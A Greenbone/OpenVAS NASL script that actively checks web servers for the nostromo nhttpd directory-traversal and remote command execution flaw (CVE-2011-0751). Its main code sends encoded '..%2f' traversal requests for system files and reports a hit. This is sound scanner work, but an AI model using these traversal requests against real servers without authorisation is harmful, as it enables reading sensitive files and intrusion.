# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103119");
  script_version("2022-11-17T10:12:09+0000");
  script_tag(name:"last_modification", value:"2022-11-17 10:12:09 +0000 (Thu, 17 Nov 2022)");
  script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-0751");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("nostromo nhttpd < 1.9.4 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("nostromo/banner");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"nostromo nhttpd is prone to a remote command execution (RCE)
  vulnerability because it fails to properly validate user-supplied data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to access arbitrary files and
  execute arbitrary commands with application-level privileges.");

  script_tag(name:"affected", value:"nostromo versions prior to 1.9.4 are affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46880");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/517026");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if ("Server: nostromo" >!< banner)
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = "/" + crap(data: "..%2f", length: 10 * 5) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
